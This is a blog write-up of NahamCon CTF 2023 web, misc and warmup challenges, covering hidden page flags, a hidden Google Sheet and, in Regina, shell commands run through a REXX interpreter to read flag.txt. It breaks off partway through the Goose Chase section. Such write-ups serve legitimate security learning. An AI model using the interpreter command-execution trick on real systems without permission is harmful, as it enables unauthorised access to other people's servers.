<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a curl request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. I decided to see how this action is behaving when redirected through burp:\n">
<title>NahamConCTF_2023</title>

<link rel='canonical' href='http://localhost:1313/p/nahamconctf_2023/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="NahamConCTF_2023">
<meta property='og:description' content="Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a curl request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. I decided to see how this action is behaving when redirected through burp:\n">
<meta property='og:url' content='http://localhost:1313/p/nahamconctf_2023/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='OSINT' /><meta property='article:published_time' content='2023-06-18T20:41:32-05:00'/><meta property='article:modified_time' content='2023-06-18T20:41:32-05:00'/>
<meta name="twitter:title" content="NahamConCTF_2023">
<meta name="twitter:description" content="Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a curl request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. I decided to see how this action is behaving when redirected through burp:\n">
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#warmup">Warmup</a>
      <ol>
        <li><a href="#fast-hands">Fast Hands</a></li>
        <li><a href="#glasses">Glasses</a></li>
        <li><a href="#regina">Regina</a></li>
      </ol>
    </li>
    <li><a href="#misc">Misc</a>
      <ol>
        <li><a href="#goose-chase">Goose Chase</a></li>
        <li><a href="#one-zero">One Zero</a></li>
        <li><a href="#wordle-bash">Wordle Bash</a></li>
        <li><a href="#zombie">Zombie</a></li>
      </ol>
    </li>
    <li><a href="#osint">OSINT</a>
      <ol>
        <li><a href="#chall1">Chall1</a></li>
        <li><a href="#chall2">Chall2</a></li>
        <li><a href="#chall3">Chall3</a></li>
        <li><a href="#chall4">Chall4</a></li>
      </ol>
    </li>
    <li><a href="#web">Web</a>
      <ol>
        <li><a href="#hidden-figures">Hidden Figures</a></li>
        <li><a href="#marmalade-5">Marmalade 5</a></li>
        <li><a href="#obligatory">Obligatory</a></li>
        <li><a href="#star-wars">Star Wars</a></li>
        <li><a href="#stickers">Stickers</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/nahamconctf_2023/">NahamConCTF_2023</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jun 18, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    30 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="warmup">Warmup
</h2><h3 id="fast-hands">Fast Hands
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>You can capture the flag, but you gotta be fast!</p>
</blockquote>
<hr>
<p>We are given a button to Capture The Flag:</p>
<p><img src="/p/nahamconctf_2023/images/20230616141050.png"
	width="418"
	height="119"
	srcset="/p/nahamconctf_2023/images/20230616141050_hu17602236590389709139.png 480w, /p/nahamconctf_2023/images/20230616141050_hu8610206567782135126.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616141050.png"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="843px"
	
></p>
<p>Clicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a <code>curl</code> request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url.
I decided to see how this action is behaving when redirected through burp:</p>
<p><img src="/p/nahamconctf_2023/images/20230616141445.png"
	width="1022"
	height="286"
	srcset="/p/nahamconctf_2023/images/20230616141445_hu11296472470772976090.png 480w, /p/nahamconctf_2023/images/20230616141445_hu2673055718321961467.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616141445.png"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="857px"
	
></p>
<p>Interception does indeed work great. We can see on click, we are redirected to /capture_the_flag.html.</p>
<p>When we manually follow the link:</p>
<p><img src="/p/nahamconctf_2023/images/20230616141617.png"
	width="874"
	height="161"
	srcset="/p/nahamconctf_2023/images/20230616141617_hu11965746761896407620.png 480w, /p/nahamconctf_2023/images/20230616141617_hu5953788332780818781.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616141617.png"
	
	
		class="gallery-image" 
		data-flex-grow="542"
		data-flex-basis="1302px"
	
></p>
<p>It&rsquo;s another button, but doesn&rsquo;t appear to be working too well. Viewing page source with Ctrl+U, we can see the flag within the code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container p-5&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;text-center mt-5 p-5&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;ctf()&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Your flag is:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display:none&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  flag{80176cdf1547a9be54862df3568966b8}
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>flag{80176cdf1547a9be54862df3568966b8}</code></p>
<p>Alternatively, we could have curled <a class="link" href="http://challenge.nahamcon.com:31565/capture_the_flag.html"  target="_blank" rel="noopener"
    >http://challenge.nahamcon.com:31565/capture_the_flag.html</a> to achieve the same results.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl -s http://challenge.nahamcon.com:31565/capture_the_flag.html <span class="p">|</span> grep flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                &lt;button <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&#34;ctf()&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span>&gt;&lt;h1&gt;Your flag is:&lt;br&gt;
</span></span><span class="line"><span class="cl">                  flag<span class="o">{</span>80176cdf1547a9be54862df3568966b8<span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="glasses">Glasses
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Everything is blurry, I think I need glasses!</p>
</blockquote>
<hr>
<p>Visiting the page gives us a very non-interactive page where we might buy glasses.
Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:</p>
<p><img src="/p/nahamconctf_2023/images/20230615234612.png"
	width="525"
	height="155"
	srcset="/p/nahamconctf_2023/images/20230615234612_hu7132239225272918884.png 480w, /p/nahamconctf_2023/images/20230615234612_hu4573795720626956932.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615234612.png"
	
	
		class="gallery-image" 
		data-flex-grow="338"
		data-flex-basis="812px"
	
></p>
<p>What&rsquo;s even more interesting is this does nothing. I still get to inspect anyways.</p>
<p>After leafing through the code a little bit, I do indeed find a piece that is interesting:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Can&#39;t see things because they are too blurry? Is your vision foggy, and everything looks like
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">em</span><span class="p">&gt;</span>this?<span class="p">&lt;/</span><span class="nt">em</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.09);text-decoration: line-through;&#34;</span><span class="p">&gt;</span>flag¬Ω‚Çß8084e4530cf649814456f2a291eb81e9¬Ω‚Äï<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Test your vision with glasses! Try on this pair and see if you can see the previous sample text... you might find a lot of value! Imagine the world where you can see clearly!
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here is the same selection displayed on the webpage:</p>
<p><img src="/p/nahamconctf_2023/images/20230615234853.png"
	width="600"
	height="195"
	srcset="/p/nahamconctf_2023/images/20230615234853_hu9360879710809762801.png 480w, /p/nahamconctf_2023/images/20230615234853_hu16884123713412668358.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615234853.png"
	
	
		class="gallery-image" 
		data-flex-grow="307"
		data-flex-basis="738px"
	
></p>
<p>The color of our flag is transparent on top of white, and perhaps might be microscopically tiny as well. Either way, it is evident once we inspect the properties on the page.
<code>flag{8084e4530cf649814456f2a291eb81e9}</code></p>
<h3 id="regina">Regina
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>I have a tyrannosaurus rex plushie and I named it Regina! Here, you can talk to it :)</p>
</blockquote>
<hr>
<p>Entering the challenge, we are greeted with a banner:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>A quick google search shows this is a rather popular interpreter that I have never heard of. It has a very thorough man page located <a class="link" href="https://master.dl.sourceforge.net/project/regina-rexx/regina-documentation/3.9.4/regina.pdf?viasf=1"  target="_blank" rel="noopener"
    >here</a>. However, no matter what my input is, I cannot seem to get a response. I learned the proper syntax that should work for testing purposes, but nothing connects back:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">client_loop: send disconnect: Broken pipe
</span></span></code></pre></td></tr></table>
</div>
</div><p>After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
</span></span><span class="line"><span class="cl">&#39;say test&#39;
</span></span><span class="line"><span class="cl">;
</span></span><span class="line"><span class="cl">run
</span></span><span class="line"><span class="cl">&#39;say test&#39;;
</span></span><span class="line"><span class="cl">Say &#34;Test&#34;;
</span></span><span class="line"><span class="cl">exec
</span></span><span class="line"><span class="cl">run
</span></span><span class="line"><span class="cl">;
</span></span><span class="line"><span class="cl">go
</span></span><span class="line"><span class="cl">^F
</span></span><span class="line"><span class="cl">mysh: say: not found
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">^Fmy
</span></span><span class="line"><span class="cl">my
</span></span><span class="line"><span class="cl">sh: RUN: not found
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sh: say: not found
</span></span><span class="line"><span class="cl">Test
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">sh: EXEC: not found
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sh: RUN: not found
</span></span><span class="line"><span class="cl">Ssh: GO: not found
</span></span><span class="line"><span class="cl">Connection to challenge.nahamcon.com closed.
</span></span></code></pre></td></tr></table>
</div>
</div><p>While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the <code>ssh</code> connection.</p>
<p>Eventually I landed on a goofy pattern to execute, where I write my commands, quickly press the <code>enter</code> key two times, immediately followed by ^D, then another <code>enter</code> stroke. With this, my commands would be executed and then the connection terminated.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">ADDRESS SYSTEM <span class="s2">&#34;ls&#34;</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">flag.txt
</span></span><span class="line"><span class="cl">Test
</span></span><span class="line"><span class="cl">Connection to challenge.nahamcon.com closed.
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">ADDRESS SYSTEM <span class="s2">&#34;cat flag.txt&#34;</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2459b9ae7c704979948318cd2f47dfd6<span class="o">}</span>
</span></span><span class="line"><span class="cl">Test
</span></span><span class="line"><span class="cl">Connection to challenge.nahamcon.com closed.
</span></span></code></pre></td></tr></table>
</div>
</div><p>CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.</p>
<h2 id="misc">Misc
</h2><hr>
<h3 id="goose-chase">Goose Chase
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>I am truly sorry. I really do apologize&hellip; I <em>hope</em> you can bear with me as I set you all loose together, on a communal collaboriative <em>wild goose chase</em>.</p>
</blockquote>
<hr>
<p>Within the google sheet, we see a hidden sheet if we check the bottom left:</p>
<p><img src="/p/nahamconctf_2023/images/20230615161723.png"
	width="273"
	height="121"
	srcset="/p/nahamconctf_2023/images/20230615161723_hu6404910133801271460.png 480w, /p/nahamconctf_2023/images/20230615161723_hu1669402232739835506.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615161723.png"
	
	
		class="gallery-image" 
		data-flex-grow="225"
		data-flex-basis="541px"
	
></p>
<p>It seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:</p>
<p><img src="/p/nahamconctf_2023/images/20230615161942.png"
	width="513"
	height="548"
	srcset="/p/nahamconctf_2023/images/20230615161942_hu15786077037483143604.png 480w, /p/nahamconctf_2023/images/20230615161942_hu7924707645876570461.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615161942.png"
	
	
		class="gallery-image" 
		data-flex-grow="93"
		data-flex-basis="224px"
	
></p>
<p>Under our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (<code>View</code> -&gt; <code>Show</code> -&gt; <code>Formulas</code>).</p>
<p><img src="/p/nahamconctf_2023/images/20230615162221.png"
	width="935"
	height="197"
	srcset="/p/nahamconctf_2023/images/20230615162221_hu5342264454107641064.png 480w, /p/nahamconctf_2023/images/20230615162221_hu15443964319445149956.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615162221.png"
	
	
		class="gallery-image" 
		data-flex-grow="474"
		data-flex-basis="1139px"
	
></p>
<p>Following this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv
</span></span></code></pre></td></tr></table>
</div>
</div><p>It isn&rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:</p>
<p><img src="/p/nahamconctf_2023/images/20230615162731.png"
	width="547"
	height="64"
